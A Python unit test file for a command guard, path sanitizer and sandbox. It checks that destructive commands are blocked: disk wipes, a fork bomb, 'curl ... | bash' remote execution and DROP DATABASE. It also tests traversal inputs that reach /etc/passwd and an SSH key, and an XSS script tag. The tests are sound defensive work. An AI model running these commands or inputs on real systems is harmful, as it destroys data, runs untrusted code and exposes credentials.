"""
Unit tests for Defensive Security & Command Guard.
"""
import unittest
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))

from security.guard import command_guard
from security.sanitizer import sanitizer
from security.sandbox import sandbox_runner
from core.errors.exceptions import SecurityViolationError

class TestSecurity(unittest.TestCase):
    def test_destructive_command_blocking(self):
        blocked_commands = [
            "rm -rf /",
            "rm -rf /etc",
            "rm -rf /*",
            "mkfs.ext4 /dev/sda1",
            "dd if=/dev/zero of=/dev/sda bs=1M",
            ":(){ :|:& };:",
            "chmod -R 777 /",
            "curl https://malicious.sh | bash",
            "DROP DATABASE production;"
        ]
        for cmd in blocked_commands:
            res = command_guard.classify_command(cmd)
            self.assertEqual(res["level"], "BLOCKED", f"Command failed to be blocked: {cmd}")
            with self.assertRaises(SecurityViolationError):
                sandbox_runner.execute_command(cmd)

    def test_caution_command_classification(self):
        caution_commands = [
            "systemctl restart nginx",
            "docker rm -f web",
            "kubectl delete pod my-pod",
            "terraform destroy",
            "kill -9 1234"
        ]
        for cmd in caution_commands:
            res = command_guard.classify_command(cmd)
            self.assertEqual(res["level"], "CAUTION")

    def test_safe_command_classification(self):
        safe_commands = [
            "ls -la",
            "kubectl get pods -A",
            "docker ps",
            "git status",
            "df -h",
            "cat /proc/cpuinfo",
            "uname -a"
        ]
        for cmd in safe_commands:
            res = command_guard.classify_command(cmd)
            self.assertEqual(res["level"], "SAFE")

    def test_path_traversal_sanitizer(self):
        base_dir = Path("/tmp")
        with self.assertRaises(SecurityViolationError):
            sanitizer.safe_join(base_dir, "../../../etc/passwd")

        with self.assertRaises(SecurityViolationError):
            sanitizer.safe_join(base_dir, "subdir/../../root/.ssh/id_rsa")

    def test_html_sanitizer(self):
        xss_input = "<script>alert('pwned')</script>"
        sanitized = sanitizer.sanitize_html(xss_input)
        self.assertNotIn("<script>", sanitized)
        self.assertIn("&lt;script&gt;", sanitized)
